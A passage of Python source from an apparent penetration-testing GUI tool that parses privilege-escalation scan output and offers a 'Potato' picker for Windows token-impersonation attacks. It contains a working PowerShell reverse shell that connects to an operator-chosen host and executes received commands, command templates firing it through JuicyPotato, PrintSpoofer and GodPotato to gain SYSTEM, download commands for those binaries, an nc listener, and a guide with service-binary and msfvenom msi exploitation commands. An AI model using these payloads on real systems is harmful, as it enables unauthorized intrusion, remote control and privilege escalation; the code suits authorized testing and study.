                    fh.write(header + clean)
                term.write(
                    f"  [+] Readable copy saved: {txt_path}", "success")
            except Exception as e:
                term.write(
                    f"  [!] Could not write {txt_path}: {e}", "warn")
                txt_path = None

            # ── Parse into Target Intel + Credential Store ────────────
            # Dispatch by script_name first (more precise than os_type):
            #   winpeas.bat / winpeas.exe → winpeas_parser
            #   PrivescCheck.ps1          → privesccheck_parser
            #   linpeas.sh                → linpeas_parser
            # Fall back to os_type for unrecognised Windows scripts so
            # a best-effort winpeas parse runs.  All three parsers push
            # into app.target_intel.add_auto_finding() (triggering the
            # blink animation) and creds into app.cred_store.
            script_lower = (self._script_name or "").lower()
            try:
                if "privesccheck" in script_lower:
                    from modules.parsers.privesccheck_parser import (
                        parse_privesccheck)
                    parse_privesccheck(
                        clean, self._app, self._target,
                        source_file=path)
                elif "winpeas" in script_lower:
                    from modules.parsers.winpeas_parser import (
                        parse_winpeas)
                    parse_winpeas(
                        clean, self._app, self._target,
                        source_file=path)
                elif "linpeas" in script_lower:
                    # linPEAS output is ~13k lines; the parse takes ~5s and
                    # would freeze the GUI on the main thread (#24).  Run it
                    # on a worker — the parser marshals its Target Intel /
                    # Credential Store pushes back via app.ui_call, so no
                    # widget is touched from this thread.
                    from modules.parsers.linpeas_parser import (
                        parse_linpeas)
                    import threading as _threading
                    _threading.Thread(
                        target=lambda c=clean, p=path: parse_linpeas(
                            c, self._app, self._target, source_file=p),
                        name="hawk-linpeas-parse",
                        daemon=True).start()
                elif script_lower.startswith(("lse", "pspy")):
                    # LSE and pspy have their OWN output formats (not linPEAS'
                    # ╔═╣ boxes), so the linPEAS parser can't read them: it
                    # extracts almost nothing and mislabels the run "linPEAS
                    # parsed".  They are read-the-output tools — LSE is a
                    # graded, human-readable report; pspy is a live process /
                    # cron monitor.  Save the .txt and point the operator at
                    # it; do NOT push a misleading (near-empty) parse into
                    # Target Intel.  (linpeas.sh via this same dialog remains
                    # the tool that auto-populates Target Intel.)
                    _tool = ("LSE" if script_lower.startswith("lse")
                             else "pspy")
                    _how = ("graded report — look for  [!] = critical, "
                            "[*] = interesting, grouped by usr/sud/fst/sys/…"
                            if _tool == "LSE" else
                            "live monitor — scan the stream for cron jobs and "
                            "short-lived root (UID=0) processes")
                    term.write(
                        f"\n  [i] {_tool} output saved — read it directly; "
                        f"HAWK does not auto-parse {_tool} into Target Intel "
                        f"(its format differs from linpeas.sh).\n"
                        f"      {_tool} is a {_how}.\n"
                        f"      Readable copy: {txt_path or path}",
                        "info")
                elif "powerup" in script_lower:
                    # PowerUp.ps1 — no dedicated parser (output is compact
                    # and human-readable).  Print a focused reading guide
                    # so the operator knows exactly what to look for.
                    term.write(
                        "\n  ─── HOW TO READ POWERUP OUTPUT ───────────────────────\n"
                        "  PowerUp.ps1 output is short and self-explanatory.\n"
                        "  HAWK does not auto-parse it — use the guide below:\n"
                        "\n"
                        "  KEY MARKERS\n"
                        "    [*] Checking <CheckName> ...   → a check is starting\n"
                        "    [+] Vulnerable!                → confirmed privesc vector\n"
                        "    AbuseFunction                  → exact exploit command\n"
                        "    ModifiablePath / CanRestart    → supporting detail\n"
                        "\n"
                        "  TOP VECTORS TO ACT ON (in priority order)\n"
                        "    1. ModifiableServiceBinaries   — overwrite the service .exe\n"
                        "       → net stop <svc> && copy evil.exe <path> && net start <svc>\n"
                        "    2. UnquotedServicePaths        — plant a .exe in a space-split path\n"
                        "       → copy evil.exe 'C:\\Program Files\\Foo.exe' && sc start <svc>\n"
                        "    3. AlwaysInstallElevated        — msi-based PrivEsc\n"
                        "       → msfvenom -p windows/exec CMD=... -f msi > evil.msi\n"
                        "          msiexec /quiet /qn /i evil.msi\n"
                        "    4. ModifiableScheduledTask     — overwrite the task binary\n"
                        "    5. TokenPrivileges             — SeImpersonatePrivilege → Potato\n"
                        "       → open 'POST-EXPLOIT → Potato Picker' in HAWK\n"
                        "\n"
                        "  The full output is displayed below and saved to:\n"
                        f"  {txt_path or path}",
                        "info")
                elif self._os == "windows":
                    # Unknown Windows script → best-effort winpeas.
                    from modules.parsers.winpeas_parser import (
                        parse_winpeas)
                    parse_winpeas(
                        clean, self._app, self._target,
                        source_file=path)
                elif self._os == "linux":
                    # Off the main thread — see the linpeas branch above (#24).
                    from modules.parsers.linpeas_parser import (
                        parse_linpeas)
                    import threading as _threading
                    _threading.Thread(
                        target=lambda c=clean, p=path: parse_linpeas(
                            c, self._app, self._target, source_file=p),
                        name="hawk-linpeas-parse",
                        daemon=True).start()
            except ImportError as e:
                term.write(
                    f"  [i] Parser not available: {e}.  Output saved "
                    "but no auto-findings generated.", "warn")
            except Exception as e:
                term.write(
                    f"  [!] Parser error: {e}", "warn")

            # ── Stream clean content into HAWK terminal ──────────────
            term.write(
                f"\n══════  {_os.path.basename(path)}  "
                f"({len(clean):,} bytes)  ══════", "success")
            for line in clean.splitlines():
                term.write(line)
            term.write(f"══════  END OF {_os.path.basename(path)}  ══════\n",
                       "success")

            # ── Open the .txt in native editor ───────────────────────
            if txt_path and _os.path.isfile(txt_path):
                try:
                    import subprocess as _sp, sys as _sys
                    if _sys.platform.startswith("linux"):
                        _sp.Popen(["xdg-open", txt_path],
                                  stdout=_sp.DEVNULL,
                                  stderr=_sp.DEVNULL)
                    elif _sys.platform == "darwin":
                        _sp.Popen(["open", txt_path])
                    else:  # Windows
                        _os.startfile(txt_path)  # type: ignore
                    term.write(
                        f"  [+] Opening {_os.path.basename(txt_path)} "
                        f"in native editor...", "success")
                except Exception as e:
                    term.write(
                        f"  [!] Could not launch editor: {e}", "warn")

        self._action_button(
            parent, "📂  OPEN OUTPUT",
            _open_result, primary=True)
        ctk.CTkLabel(
            parent,
            text=f"       Reads {self._exfil_path}, strips ANSI codes, "
                 f"writes a readable .txt copy alongside it,\n"
                 f"       parses findings into Target Intel + Credential "
                 f"Store, streams output to this terminal,\n"
                 f"       and opens the .txt in your native editor.  If "
                 f"the .out isn't where expected, a file picker opens.",
            font=_f("sm"),
            text_color=COLORS["text_dim"],
            justify="left",
            anchor="w").pack(fill="x", padx=4, pady=(0, 8))

        # Bottom tip
        look_for = (
            "Look for: RED = critical • SUID binaries • sudo -l entries • "
            "world-writable cron • kernel-exploit hits"
            if self._os == "linux" else
            "Look for: RED = critical • AlwaysInstallElevated • unquoted "
            "service paths • stored creds • weak ACLs")
        ctk.CTkLabel(
            parent, text=f"  ★ {look_for}",
            font=_f("sm", True),
            text_color=COLORS["text_yellow"],
            wraplength=680, justify="left",
            anchor="w").pack(fill="x", padx=4, pady=(6, 8))


def _sha256_file(path, _chunk=65536):
    """Hex SHA-256 of the file at `path`, read in fixed-size chunks.

    Pure helper (no GUI) so the DOWNLOAD button's integrity line is
    unit-testable headless.  Per E-01 (CWE-494) the potato binaries run
    target-side (Windows privesc, same profile as PEAS/pspy), so the
    integrity check scales with the place of execution: this digest is
    informational transparency shown post-download -- the same spirit as
    the `&& sha256sum` already on the framework tools in post_exploit.py,
    never a fail-closed gate.  (a) version-pin + a pinned SHA-256 stays an
    opt-in hardening for a later pass.
    """
    import hashlib
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(_chunk), b""):
            h.update(chunk)
    return h.hexdigest()


# ── Potato variant catalogue ──────────────────────────────────────────
# show_potato_picker_dialog() renders one radio row per entry and reads a
# fixed set of keys off each dict — keep every variant shaped the same:
#   id           radio value + the string _auto_pick() returns; the
#                picker defaults variant_var to that id, so every id
#                _auto_pick can emit MUST exist here (juicy / printspoofer
#                / godpotato) or the default selection falls through.
#   name         label shown on the radio button
#   compat       one-line "which Windows builds" blurb (display only)
#   notes        one-line operator caveat (display only)
#   binary_name  file the DOWNLOAD button curls to, and the name the
#                exec command assumes under C:\Windows\Temp\ on target
#   url          direct release-asset URL for `curl -L --fail -o`
#   cmd_template str.format()-ed with bin=<remote path>, lhost, lport in
#                _update_preview(); every LITERAL brace is therefore
#                doubled ({{ }}) and only {bin}/{lhost}/{lport} stay bare.
#
# Scope: only the three variants that (a) ship a single prebuilt .exe the
# DOWNLOAD button can fetch directly and (b) cover the full OS span
# _auto_pick() maps to.  RoguePotato / SweetPotato / EfsPotato ship as
# zips or source and need a relay/compile step the single-exe download +
# one-shot exec model here can't express, so they're intentionally left
# out rather than wired to a URL that would 404 under `curl --fail`.

# Shared SYSTEM-level PowerShell reverse shell every variant fires through
# its exec flag.  Internals use single quotes only (host string, prompt)
# so the payload nests inside each tool's double-quoted argument with one
# consistent layer of \" escaping; it is caught by the `nc -lvnp <LPORT>`
# listener the dialog tells the operator to start.
_PS_SYSTEM_REVSHELL = (
    "powershell -nop -w hidden -c \\\""
    "$c=New-Object Net.Sockets.TcpClient('{lhost}',{lport});"
    "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
    "$sb=([text.encoding]::ASCII).GetBytes($r2);"
    "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
    "\\\""
)

_POTATO_VARIANTS = [
    {
        "id": "juicy",
        "name": "JuicyPotato",
        "compat": ("Windows 7 / 8 / 8.1 - Server 2008 R2 / 2012 / "
                   "2012 R2 (NT 6.0-6.3). Dead on Server 2019+ / "
                   "Win10 1809+ (DCOM activation hardened)."),
        "notes": ("Classic RottenPotatoNG DCOM token-stealer. Needs a "
                  "CLSID that maps to a privileged COM server on the "
                  "target; the bundled BITS CLSID fits most 2008 R2 / "
                  "2012 builds - if activation fails, pick another from "
                  "ohpe's per-OS CLSID list."),
        "binary_name": "JuicyPotato.exe",
        "url": ("https://github.com/ohpe/juicy-potato/releases/"
                "download/v0.1/JuicyPotato.exe"),
        "cmd_template": (
            "{bin} -t * -l 9999 "
            "-p C:\\Windows\\System32\\cmd.exe -a \"/c "
            + _PS_SYSTEM_REVSHELL +
            "\" -c {{4991d34b-80a1-4291-83b6-3328366b9097}}"),
    },
    {
        "id": "printspoofer",
        "name": "PrintSpoofer",
        "compat": ("Windows 10 - Server 2016 / 2019. Abuses the Print "
                   "Spooler named-pipe trick; MS hardened it in the "
                   "late-2020 updates, so a fully patched 2019 / Win10 "
                   "may refuse."),
        "notes": ("No CLSID needed - leans on the Spooler service. If "
                  "the Spooler is disabled or patched, fall back to "
                  "GodPotato."),
        "binary_name": "PrintSpoofer64.exe",
        "url": ("https://github.com/itm4n/PrintSpoofer/releases/"
                "download/v1.0/PrintSpoofer64.exe"),
        "cmd_template": ("{bin} -c \"" + _PS_SYSTEM_REVSHELL + "\""),
    },
    {
        "id": "godpotato",
        "name": "GodPotato (.NET 4)",
        "compat": ("Windows 8 -> Windows 11 - Server 2012 -> Server "
                   "2022. Requires the .NET 4+ runtime on target (use "
                   "the NET35 build for older runtimes)."),
        "notes": ("Most reliable modern pick - no CLSID, works where "
                  "JuicyPotato is patched out. Runtime-bound: swap to "
                  "GodPotato-NET35.exe on hosts with only .NET 3.5."),
        "binary_name": "GodPotato-NET4.exe",
        "url": ("https://github.com/BeichenDream/GodPotato/releases/"
                "download/V1.20/GodPotato-NET4.exe"),
        "cmd_template": ("{bin} -cmd \"" + _PS_SYSTEM_REVSHELL + "\""),
    },
]


def show_potato_picker_dialog(parent, app):
    """Potato variant picker.

    Flow:
      1. Auto-recommend a variant from the OS fingerprint (if any).
      2. User picks a variant (override allowed).
      3. User enters LHOST / LPORT for the reverse shell.
      4. DOWNLOAD button → curl the .exe into HAWK's dicts/ folder
         (same convention as the target-profile wordlist — keep all
         generated artifacts together under the HAWK tree).
      5. COPY EXECUTION CMD → paste-ready command that runs the
         downloaded binary on the target shell, triggering a revshell
         back to the user's Kali.
    """
    import os as _os
    import subprocess as _sp
    import threading as _th

    # ── OS-fingerprint-based default pick ─────────────────────────
    # Pull everything string-ish out of the fingerprint so regex/in
    # matches below have the best shot.  The real attribute names on
    # OSFingerprint (modules/exploit_suggester.OSFingerprint) are
    # `os_raw` (human string from NSE, e.g. "Microsoft Windows Server
    # 2008 R2"), `platform` ("windows"/"linux"), and `version` (e.g.
    # "6.1" — the NT version which _OS_VERSION_MAP resolves to a name).
    # The old code read `fp.os` which does NOT exist → the auto-pick
    # fell through every branch and always returned "godpotato".
    fp = None
    try:
        fp = getattr(app.target_intel, "_fp", None)
    except Exception:
        fp = None

    fp_os = ""
    try:
        if fp:
            # Glue together every label-ish string on the fingerprint so
            # the keyword search below has maximal context.  Also expand
            # the NT version number to a human OS name via the static
            # map, so "6.1" gets recognised as "Server 2008 R2" even
            # when os_raw happens to be empty.
            bits = []
            for attr in ("os_raw", "platform",
                         "ntlm_product_version", "computer_name",
                         "fqdn"):
                v = getattr(fp, attr, "") or ""
                if v:
                    bits.append(str(v))
            nt_ver = (getattr(fp, "version", "") or "").strip()
            if nt_ver:
                bits.append(nt_ver)
                try:
                    from modules.exploit_suggester import OSFingerprint
                    friendly = OSFingerprint._OS_VERSION_MAP.get(
                        nt_ver, "")
                    if friendly:
                        bits.append(friendly)
                except Exception:
                    pass
            fp_os = " ".join(bits).lower()
    except Exception:
        pass

    def _auto_pick(os_hint: str) -> str:
        """Map the aggregated fingerprint string to the best potato
        variant.  Order matters — more specific checks (Server 2008
        R2, Win 7) must come BEFORE the generic "server 2019" / modern
        fall-through so we don't mis-recommend GodPotato on legacy
        targets where it won't run.

        Covered cases:
          · NT 5.x / 6.0 / 6.1  (XP / 2003 / Vista / 7 / 2008 R2) → JuicyPotato
          · NT 6.2 / 6.3        (Win 8 / 8.1 / 2012 / 2012 R2)    → JuicyPotato
                                 (can't use PrintSpoofer — Spooler
                                  privesc was Win10+)
          · Server 2016 / 2019                                    → PrintSpoofer
          · Win 10 / 11 / Server 2022                             → GodPotato
          · Unknown / empty                                       → GodPotato
        """
        if not os_hint:
            return "godpotato"
        # Legacy NT (5.x / 6.0 / 6.1) — JuicyPotato is the only Potato
        # that runs here.  Match generous variants of the human label
        # PLUS the bare NT version numbers (fp.version can be "6.1"
        # or "6.0" even when os_raw is empty).
        _legacy_keys = (
            "xp ", "windows xp",
            "server 2003", "server 2008", "windows 7", "vista",
            "windows 8", "server 2012",
            " 5.1", " 5.2", " 6.0", " 6.1", " 6.2", " 6.3",
        )
        if any(k in os_hint for k in _legacy_keys):
            return "juicy"
        # 2016 / 2019 window where PrintSpoofer is the reliable pick
        # (before MS patched the Spooler in late 2020).
        if "server 2016" in os_hint or "server 2019" in os_hint:
            return "printspoofer"
        return "godpotato"  # modern default (Win 10/11, Server 2022)

    auto_pick = _auto_pick(fp_os)

    # ── LHOST detection ───────────────────────────────────────────
    try:
        from utils.runner import lhost_detect
        lhost_default = lhost_detect() or "<KALI_IP>"
    except Exception:
        lhost_default = "<KALI_IP>"

    # ── Download dir (use DICTS_DIR's parent convention) ──────────
    try:
        from utils.config import DICTS_DIR
        dl_dir = DICTS_DIR
    except Exception:
        dl_dir = _os.path.join(
            _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))),
            "dicts")
    try:
        _os.makedirs(dl_dir, exist_ok=True)
    except Exception:
        pass

    # ── Window ───────────────────────────────────────────────────
    win = _make_win(parent, "POTATO — pick a variant", 820, 640)
    _title(win, "🥔  POTATO — privilege escalation picker")
    _sub(win,
          "SeImpersonate (or SeAssignPrimaryToken) → NT AUTHORITY\\SYSTEM "
          "via DCOM/NTLM relay.",
          COLORS["text_dim"])

    _note_box(
        win,
        "Prerequisite: the target shell user MUST have "
        "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.\n"
        "Verify first with the Token Privileges card — run "
        "`whoami /priv` in the target shell and look for one of "
        "those privileges set to Enabled.  Service accounts (IIS "
        "AppPool, MSSQL, NETWORK SERVICE, LOCAL SERVICE) usually "
        "have it; regular domain users usually don't.",
        COLORS["text_yellow"])

    # Variant picker (radio list with expanded description).
    variant_var = ctk.StringVar(value=auto_pick)
    lhost_var   = ctk.StringVar(value=lhost_default)
    lport_var   = ctk.StringVar(value="4444")

    picker_frame = ctk.CTkFrame(
        win, fg_color=COLORS["bg_card"],
        border_color=COLORS["border_dim"], border_width=1,
        corner_radius=4)
    picker_frame.pack(fill="x", padx=16, pady=(8, 4))

    ctk.CTkLabel(
        picker_frame,
        text=(f"  Target OS fingerprint: "
              f"{fp_os or '<unknown — manual pick>'}"),
        font=_f("sm"), text_color=COLORS["text_dim"],
        anchor="w").pack(fill="x", padx=10, pady=(6, 2))

    for v in _POTATO_VARIANTS:
        row = ctk.CTkFrame(picker_frame, fg_color="transparent")
        row.pack(fill="x", padx=10, pady=3)
        is_auto = (v["id"] == auto_pick)
        label_text = f"  {v['name']}"
        if is_auto:
            label_text += "   ⭐  RECOMMENDED FOR THIS TARGET"
        rb = ctk.CTkRadioButton(
            row, text=label_text, variable=variant_var,
            value=v["id"],
            font=_f("md", True),
            text_color=COLORS["text_green"] if is_auto
                       else COLORS["text_bright"],
            fg_color=COLORS["border_green"],
            border_color=COLORS["border_dim"])
        rb.pack(anchor="w")
        ctk.CTkLabel(
            row,
            text=f"     Compat: {v['compat']}\n     {v['notes']}",
            font=_f("sm"), text_color=COLORS["text_dim"],
            anchor="w", justify="left", wraplength=720
        ).pack(fill="x")

    # LHOST / LPORT inputs + live command preview.
    net_frame = ctk.CTkFrame(
        win, fg_color=COLORS["bg_card"],
        border_color=COLORS["border_dim"], border_width=1,
        corner_radius=4)
    net_frame.pack(fill="x", padx=16, pady=4)

    net_row = ctk.CTkFrame(net_frame, fg_color="transparent")
    net_row.pack(fill="x", padx=10, pady=8)
    ctk.CTkLabel(
        net_row, text="LHOST:", width=70, anchor="w",
        font=_f("sm"), text_color=COLORS["text_dim"]
    ).pack(side="left")
    lhost_e = ctk.CTkEntry(
        net_row, textvariable=lhost_var, width=180, height=28,
        font=_f("sm"), fg_color=COLORS["bg_secondary"],
        text_color=COLORS["text_bright"],
        border_color=COLORS["border_green"], border_width=1,
        corner_radius=3)
    lhost_e.pack(side="left", padx=(0, 14))
    ctk.CTkLabel(
        net_row, text="LPORT:", width=70, anchor="w",
        font=_f("sm"), text_color=COLORS["text_dim"]
    ).pack(side="left")
    lport_e = ctk.CTkEntry(
        net_row, textvariable=lport_var, width=90, height=28,
        font=_f("sm"), fg_color=COLORS["bg_secondary"],
        text_color=COLORS["text_bright"],
        border_color=COLORS["border_green"], border_width=1,
        corner_radius=3)
    lport_e.pack(side="left")

    # Command preview.
    preview_frame = ctk.CTkFrame(
        win, fg_color=COLORS["bg_card"],
        border_color=COLORS["border_green"], border_width=1,
        corner_radius=4)
    preview_frame.pack(fill="both", expand=True, padx=16, pady=4)
    ctk.CTkLabel(
        preview_frame,
        text="  Target-side execution command (runs AFTER you host "
              "the binary):",
        font=_f("sm", True), text_color=COLORS["text_green"],
        anchor="w").pack(fill="x", padx=10, pady=(6, 2))
    preview_box = ctk.CTkTextbox(
        preview_frame, height=90, font=_f("sm"),
        fg_color=COLORS["bg_secondary"],
        text_color=COLORS["text_bright"],
        border_color=COLORS["border_dim"], border_width=1,
        corner_radius=3)
    preview_box.pack(fill="both", expand=True, padx=10, pady=(0, 6))

    def _current_variant():
        vid = variant_var.get()
        for v in _POTATO_VARIANTS:
            if v["id"] == vid:
                return v
        return _POTATO_VARIANTS[0]

    def _update_preview(*_):
        v = _current_variant()
        # Assume the binary was hosted to C:\Windows\Temp\<name> on
        # the target — matches the PEAS workflow's transfer path.
        remote_bin = f"C:\\Windows\\Temp\\{v['binary_name']}"
        cmd = v["cmd_template"].format(
            bin=remote_bin,
            lhost=lhost_var.get().strip() or "<KALI_IP>",
            lport=lport_var.get().strip() or "4444")
        listener_hint = (
            f"\n\n# On your Kali, first start the listener:\n"
            f"nc -lvnp {lport_var.get().strip() or '4444'}")
        preview_box.configure(state="normal")
        preview_box.delete("1.0", "end")
        preview_box.insert("1.0", cmd + listener_hint)
        preview_box.configure(state="disabled")

    variant_var.trace_add("write", _update_preview)
    lhost_var.trace_add("write", _update_preview)
    lport_var.trace_add("write", _update_preview)
    _update_preview()

    # ── Actions ───────────────────────────────────────────────────
    def _download():
        v = _current_variant()
        out_path = _os.path.join(dl_dir, v["binary_name"])
        try:
            app.terminal.write(
                f"  [*] Downloading {v['name']} → {out_path}",
                "info")
        except Exception:
            pass

        def _worker():
            try:
                r = _sp.run(
                    ["curl", "-L", "-sS", "--fail",
                     "-o", out_path, v["url"]],
                    capture_output=True, text=True, timeout=120)
                if r.returncode == 0 and _os.path.isfile(out_path):
                    size = _os.path.getsize(out_path)
                    # E-01 (CWE-494): the .exe runs target-side, so show
                    # its SHA-256 as informational transparency (like the
                    # `&& sha256sum` on the post_exploit.py tools) -- not a
                    # fail-closed gate, not a pinned hash.
                    try:
                        digest = _sha256_file(out_path)
                    except Exception:
                        digest = None
                    def _ui_ok():
                        try:
                            app.terminal.write(
                                f"  [+] Downloaded: {out_path} "
                                f"({size:,} bytes)", "success")
                            if digest:
                                app.terminal.write(
                                    f"      SHA-256: {digest}", "info")
                        except Exception:
                            pass
                    try:
                        win.after(0, _ui_ok)
                    except Exception:
                        pass
                else:
                    err = (r.stderr or "").strip() or r.stdout
                    def _ui_fail():
                        try:
                            app.terminal.write(
                                f"  [!] Download failed: {err}",
                                "error")
                        except Exception:
                            pass
                    try:
                        win.after(0, _ui_fail)
                    except Exception:
                        pass
            except Exception as e:
                try:
                    win.after(
                        0,
                        lambda: app.terminal.write(
                            f"  [!] Download exception: {e}",
                            "error"))
                except Exception:
                    pass

        _th.Thread(target=_worker, daemon=True).start()

    def _copy_cmd():
        try:
            preview_box.configure(state="normal")
            cmd_text = preview_box.get("1.0", "end").strip()
            preview_box.configure(state="disabled")
            try:
                from utils.clipboard import clipboard_copy
                clipboard_copy(cmd_text)
            except Exception:
                try:
                    win.clipboard_clear()
                    win.clipboard_append(cmd_text)
                    win.update()
                except Exception:
                    pass
            try:
                app.terminal.write(
                    "  [+] Potato execution command copied to "
                    "clipboard.", "success")
            except Exception:
                pass
        except Exception as e:
            try:
                app.terminal.write(
                    f"  [!] Clipboard copy failed: {e}", "warn")
            except Exception:
                pass

    # ── Listener status label (inline warning / success, C.1) ────────
    # Created here so _start_listener() can reference it as a closure,
    # but packed AFTER the button row so it appears below the buttons.
    listener_warn_lbl = ctk.CTkLabel(
        win, text="",
        font=_f("sm"), text_color=COLORS["text_red"],
        anchor="w")

    def _start_listener():
        """Check LPORT, warn inline if busy, else open xterm nc listener."""
        port_str = lport_var.get().strip()
        try:
            port = int(port_str)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            listener_warn_lbl.configure(
                text=f"  ⚠  Invalid port: '{port_str}' — enter a number "
                     f"between 1 and 65535",
                text_color=COLORS["text_red"])
            return

        from utils.runner import is_port_free, _open_terminal
        if not is_port_free(port):
            listener_warn_lbl.configure(
                text=f"  ⚠  Port {port} is already in use — "
                     f"close the existing listener first, then retry.",
                text_color=COLORS["text_red"])
            return

        # Port free — open xterm with nc listener
        listener_warn_lbl.configure(
            text=f"  ✓  Listener started on :{port} — "
                 f"run the Potato command on the target now.",
            text_color=COLORS["text_green"])

        script = (
            f"echo '═══  HAWK — nc listener :{port}  ═══'; "
            f"echo 'Waiting for reverse shell from target...'; "
            f"echo ''; "
            f"nc -lvnp {port}; "
            f"echo ''; echo '[+] Connection received / closed.'; "
            f"read -p 'Press ENTER to close...'")
        ok = _open_terminal(f"HAWK — nc :{port} potato shell", script)
        if not ok:
            listener_warn_lbl.configure(
                text="  ⚠  Could not open a terminal emulator — "
                     f"start the listener manually: nc -lvnp {port}",
                text_color=COLORS["text_red"])
        else:
            try:
                app.terminal.write(
                    f"  [+] Reverse shell listener started on :{port} — "
                    f"execute the Potato command on the target now.",
                    "success")
            except Exception:
                pass

    row = _btn_row(win)
    _btn(row, "⬇  DOWNLOAD BINARY", _download, primary=True, w=200)
    _btn(row, "📋  COPY EXECUTION CMD", _copy_cmd, w=200)
    _btn(row, "▶  START LISTENER", _start_listener, w=180)
    _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)

    # Pack the status label below the button row
    listener_warn_lbl.pack(fill="x", padx=20, pady=(2, 6))


__all__ = ['show_windows_privesc_context_dialog', '_recommend_winpeas_exe_variant', 'show_winpeas_exe_preflight_dialog', 'show_linux_privesc_context_dialog', 'PostExploitGuideDialog', 'show_potato_picker_dialog']
